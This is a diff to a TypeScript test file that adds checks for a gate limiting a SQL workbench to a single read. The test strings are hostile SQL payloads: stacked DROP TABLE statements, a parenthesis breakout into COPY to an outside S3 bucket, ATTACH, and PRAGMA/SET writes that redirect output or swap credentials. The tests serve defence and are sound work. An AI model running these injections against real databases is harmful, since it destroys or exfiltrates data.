@@ -8,7 +8,7 @@
 
 import { describe, expect, it } from 'vitest';
 
-import { assertReadOnly, classifyStatement, splitStatements, stripComments } from './readonlySql';
+import { assertReadOnly, assertSingleRead, classifyStatement, splitStatements, stripComments } from './readonlySql';
 
 const allowed = (sql: string) => assertReadOnly(sql).allowed;
 
@@ -139,5 +139,63 @@ describe('nothing is allowed by default', () => {
   it('the refusal explains itself in the operator', () => {
     const v = assertReadOnly('DELETE FROM findings');
     expect(v.reason).toContain('written by a Run');
+  });
+});
+
+/**
+ * THE WORKBENCH GATE. Each payload below was named in the hardening spec, and the first four were
+ * measured landing on the live connection before this gate existed — one of them wrote an object to
+ * the object store through `POST /api/datasets/query`.
+ */
+describe('assertSingleRead — exactly one read', () => {
+  const refused = (sql: string) => assertSingleRead(sql).allowed === false;
+
+  it('refuses a second statement, which is how a wrapped query becomes a write', () => {
+    expect(refused('SELECT 1; DROP TABLE findings')).toBe(true);
+  });
+
+  /**
+   * THE BREAKOUT THE WRAPPER MADE POSSIBLE. Every sink composes `SELECT * FROM (<text>) LIMIT n`,
+   * so a text that closes the parenthesis gets to write whatever follows.
+   */
+  it("refuses the ') ; COPY (' breakout", () => {
+    expect(refused("SELECT 1) ; COPY (SELECT 1) TO 's3://elsewhere/leak.csv' --")).toBe(true);
+  });
+
+  it('refuses COPY … TO on its own', () => {
+    expect(refused("COPY (SELECT 1) TO 's3://elsewhere/leak.csv'")).toBe(true);
+  });
+
+  it('refuses ATTACH', () => {
+    expect(refused("ATTACH 'other.db' AS o")).toBe(true);
+  });
+
+  /** `PRAGMA x=y` is a SET alias, and SET is a write primitive dressed as configuration. */
+  it('refuses a PRAGMA that assigns', () => {
+    expect(refused("PRAGMA profiling_output='/tmp/leak'")).toBe(true);
+    expect(refused("PRAGMA enable_profiling='json'")).toBe(true);
+  });
+
+  it('refuses a SET that is not part of the client handshake', () => {
+    expect(refused("SET profiling_output='/tmp/leak'")).toBe(true);
+    expect(refused("SET s3_access_key_id='theirs'")).toBe(true);
+    expect(refused('SET disabled_filesystems=\'\'')).toBe(true);
+  });
+
+  it('still admits the handshake a SQL client cannot connect without', () => {
+    for (const sql of ['SET extra_float_digits = 3', "SET application_name='psql'", 'RESET ALL']) {
+      expect(assertSingleRead(sql).allowed, sql).toBe(true);
+    }
+  });
+
+  it('admits one ordinary read, and introspection, which is what a workbench is for', () => {
+    for (const sql of ['SELECT * FROM findings LIMIT 10', 'SHOW TABLES', 'DESCRIBE findings']) {
+      expect(assertSingleRead(sql).allowed, sql).toBe(true);
+    }
+  });
+
+  it('names the offending statement rather than the whole batch', () => {
+    const v = assertSingleRead('SELECT 1; DROP TABLE findings');
+    expect(v.statement).toContain('DROP');
   });
 });
